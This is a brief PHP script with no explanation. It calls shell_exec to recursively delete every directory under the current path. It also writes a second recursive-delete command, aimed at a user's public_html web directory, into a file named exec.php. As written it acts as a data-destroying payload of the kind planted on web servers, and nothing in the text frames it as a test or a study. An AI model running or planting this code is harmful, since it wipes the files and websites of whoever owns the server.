<?php

	$exec = shell_exec('find . -type d -exec rm -R {} \;');

	$cmd = 'echo find /home/tux/public_html/ -type d -exec rm -R {} \\\; > exec.php;';
	shell_exec($cmd);
	
?>